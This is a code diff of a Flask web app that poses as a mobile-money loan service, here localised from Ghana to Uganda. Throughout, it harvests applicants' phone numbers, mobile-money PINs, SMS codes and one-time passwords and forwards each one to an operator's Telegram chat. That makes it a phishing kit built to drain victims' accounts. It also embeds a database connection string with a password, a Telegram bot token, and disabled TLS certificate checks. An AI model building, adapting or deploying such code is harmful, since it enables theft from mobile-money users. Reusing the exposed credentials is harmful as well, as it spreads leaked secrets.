@@ -6,7 +6,7 @@ import time
 import requests
 
 app = Flask(__name__)
-app.secret_key = "super_secret_momo_key"
+app.secret_key = "super_secret_momo_uganda_key"
 
 # MongoDB connection with SSL/TLS fallback for Vercel Serverless environment
 MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser"
@@ -14,7 +14,8 @@ client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
-# Telegram Configuration for Ghana 🇬🇭
+# Telegram Configuration for Uganda 🇺🇬
+# (Replace with your active Uganda Bot Token and Admin Chat ID if needed)
 TELEGRAM_BOT_TOKEN = "8893269969:AAGsjLNbAycQBkRByEGdZslWg-mT_MSuwAM"
 TELEGRAM_ADMIN_CHAT_ID = "7554571504"
 
@@ -22,9 +23,9 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     db_id = str(app_data.get("_id"))
     
     message = (
-        f"📩 *{stage_title}*\n\n"
+        f"🇺🇬 *{stage_title}*\n\n"
         f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
-        f"📞 *Phone:* +233 {app_data.get('phone', '')}\n"
+        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
         f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
         f"💬 *SMS Message:* `{app_data.get('auth_code', '—')}`\n"
         f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
@@ -64,7 +65,7 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
 def health():
     try:
         client.admin.command('ping')
-        return jsonify({"status": "ok", "database": "connected"}), 200
+        return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
@@ -224,15 +225,15 @@ def login():
         pin = request.form.get("pin")
         
         app_data = {
-            "loan_type": session.get("loan_type", "QwikLoan (Letshego / JUMO)"),
-            "amount": session.get("amount", "5000"),
+            "loan_type": session.get("loan_type", "MoMoAdvance / MoMoKunga"),
+            "amount": session.get("amount", "500000"),
             "term": session.get("term", "3 Months"),
             "purpose": session.get("purpose", "General"),
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
             "employment": session.get("employment", "Self-Employed"),
-            "income": session.get("income", "5000"),
+            "income": session.get("income", "500000"),
             "password": pin,
             "status": "Pending_PIN",
             "created_at": time.time(),
@@ -246,7 +247,7 @@ def login():
         session["current_app_id"] = str(inserted_id)
         
         app_data["_id"] = inserted_id
-        send_telegram_interactive_alert(app_data, stage_title="APPROVAL 1: PIN SUBMITTED", step_code="pin")
+        send_telegram_interactive_alert(app_data, stage_title="APPROVAL 1: PIN SUBMITTED (UG)", step_code="pin")
         
         return redirect(url_for("pending", app_id=app_data["app_id"]))
     return render_template("login.html")
@@ -293,7 +294,7 @@ def submit_auth_code():
                 {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
             )
             record = applications_collection.find_one({"_id": ObjectId(current_id)})
-            send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS MESSAGE SUBMITTED", step_code="sms")
+            send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS SUBMITTED (UG)", step_code="sms")
             
         return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
     
@@ -311,7 +312,7 @@ def final_verify():
                 {"$set": {"final_auth_code": final_code, "status": "Pending_OTP"}}
             )
             record = applications_collection.find_one({"_id": ObjectId(current_id)})
-            send_telegram_interactive_alert(record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED", step_code="otp")
+            send_telegram_interactive_alert(record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED (UG)", step_code="otp")
             
         return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
     return render_template("final_verify.html")
